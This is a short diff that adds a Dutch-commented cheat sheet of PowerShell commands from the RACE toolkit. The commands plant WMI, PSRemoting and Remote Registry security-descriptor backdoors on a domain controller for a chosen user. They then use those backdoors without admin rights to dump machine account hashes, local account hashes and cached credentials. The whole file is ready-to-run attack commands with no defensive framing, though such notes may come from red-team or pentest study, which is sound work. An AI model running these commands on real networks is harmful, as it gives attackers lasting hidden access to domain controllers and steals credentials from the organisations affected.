@@ -1,0 +1,11 @@
+# Security Descriptor backdoors via RACE toolkit (DA nodig)
+# WMI backdoor:
+Import-Module .\RACE.ps1; Set-RemoteWMI -SamAccountName targetuser -ComputerName dc01 -namespace 'root\cimv2' -Verbose
+# PSRemoting backdoor:
+Set-RemotePSRemoting -SamAccountName targetuser -ComputerName dc01 -Verbose
+# Remote Registry backdoor:
+Add-RemoteRegBackdoor -ComputerName dc01 -Trustee targetuser -Verbose
+# Gebruik na backdoor (zonder admin):
+Get-RemoteMachineAccountHash -ComputerName dc01 -Verbose
+Get-RemoteLocalAccountHash -ComputerName dc01 -Verbose
+Get-RemoteCachedCredential -ComputerName dc01 -Verbose
